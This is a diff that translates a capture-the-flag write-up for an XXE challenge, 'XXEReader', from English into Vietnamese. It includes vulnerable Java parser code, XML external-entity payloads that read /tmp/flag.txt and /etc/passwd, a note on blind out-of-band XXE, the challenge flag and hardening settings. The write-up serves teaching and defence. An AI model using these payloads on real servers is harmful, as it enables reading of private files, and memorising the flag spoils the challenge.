@@ -1,12 +1,12 @@
-# Challenge 15: XXEReader - Solution
+# Thử thách 15: XXEReader - Giải pháp
 
-## Vulnerability Type
-**XML External Entity (XXE) Injection**
+## Loại lỗ hổng
+**XML External Entity (XXE) Injection (Chèn thực thể bên ngoài XML)**
 
-## Description
-The application parses XML without disabling external entity processing, allowing attackers to read arbitrary files from the server.
+## Mô tả
+Ứng dụng có tính năng nhận và phân tích cú pháp (parse) dữ liệu XML nhưng lại không tắt tính năng xử lý các "thực thể bên ngoài" (External Entities). Điều này cho phép kẻ tấn công truy xuất (read) các tệp hệ thống trên máy chủ hoặc khởi tạo kết nối mạng ngoài ý muốn.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```java
 // VULNERABLE: XXE enabled (no secure factory)
 DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
@@ -14,14 +14,14 @@ DocumentBuilder builder = factory.newDocumentBuilder();
 Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")));
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-### Step 1: Understand the Target
-- The flag is stored at `/tmp/flag.txt`
-- The application parses XML and extracts `<name>` elements
-- We can define external entities to read files
+### Bước 1: Thu thập thông tin mục tiêu
+- Flag được cất giấu trong file: `/tmp/flag.txt`
+- Ứng dụng sẽ parse cấu trúc XML và bóc tách dữ liệu từ thẻ `<name>` để in ra màn hình.
+- Chúng ta sẽ định nghĩa một thực thể bên ngoài (External Entity) để đọc nội dung file cục bộ và chèn vào thẻ `<name>`.
 
-### Step 2: Craft XXE Payload
+### Bước 2: Tạo Payload XXE
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE products [
@@ -32,15 +32,15 @@ Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")
 </products>
 ```
 
-### Step 3: Submit the Payload
-1. Navigate to the XXEReader application
-2. Replace the default XML with the payload above
-3. Click "Parse XML"
-4. The flag content will be displayed in the `<name>` element output
+### Bước 3: Đẩy Payload lên Server
+1. Truy cập vào ứng dụng web XXEReader.
+2. Dán đoạn Payload XML độc hại thay thế cho đoạn XML mặc định.
+3. Bấm nút "Parse XML".
+4. Nội dung của tệp `/tmp/flag.txt` sẽ hiển thị trọn vẹn tại vị trí của thẻ `<name>`.
 
-## Alternative Payloads
+## Payload thay thế
 
-### Read /etc/passwd
+### Đọc file `/etc/passwd`
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE products [
@@ -51,7 +51,8 @@ Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")
 </products>
 ```
 
-### Using Parameter Entities
+### Kỹ thuật Out-Of-Band (OOB) XXE bằng Parameter Entities
+Dùng trong trường hợp ứng dụng không in kết quả thẻ `<name>` ra màn hình (Blind XXE):
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE products [
@@ -70,14 +71,14 @@ Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")
 FCTF{xxe_r34ds_y0ur_f1l3s}
 ```
 
-## How It Works
-- XML parsers can process Document Type Definitions (DTD)
-- DTDs can define external entities that reference files or URLs
-- When the entity is used in the XML, the parser fetches and includes the content
-- This allows reading arbitrary files the application has access to
+## Cách hoạt động
+- Trình phân tích cú pháp (XML Parser) hỗ trợ tính năng định nghĩa Document Type Definition (DTD).
+- DTD cho phép khai báo các Entity (thực thể) trỏ tới các file (file://) hoặc URL bên ngoài (http://).
+- Khi Entity (ở đây là `&xxe;`) được gọi trong thân XML, trình parser sẽ xử lý nó bằng cách đi đọc file `/tmp/flag.txt` rồi mang nội dung thế chỗ vào đó.
+- Lỗ hổng này xảy ra bởi vì server mặc định tin tưởng và phân giải toàn bộ thực thể XML một cách ngây thơ.
 
-## Mitigation
-- Disable external entity processing:
+## Biện pháp phòng ngừa (Mitigation)
+- Cách tốt nhất là tắt hoàn toàn tính năng nạp Thực thể bên ngoài (External Entities) và DTD trong thư viện parser:
   ```java
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
@@ -87,8 +88,5 @@ FCTF{xxe_r34ds_y0ur_f1l3s}
   factory.setXIncludeAware(false);
   factory.setExpandEntityReferences(false);
   ```
-- Use less complex data formats (JSON instead of XML)
-- Keep XML parsers updated
-- Implement input validation
-- Use XML libraries with secure defaults
-- Apply principle of least privilege for file access
+- Chuyển sang sử dụng JSON thay cho XML nếu có thể (JSON không có các rủi ro phức tạp về Entity).
+- Luôn cập nhật thư viện parser lên bản mới nhất (các bản Java mới thường chặn XXE mặc định).
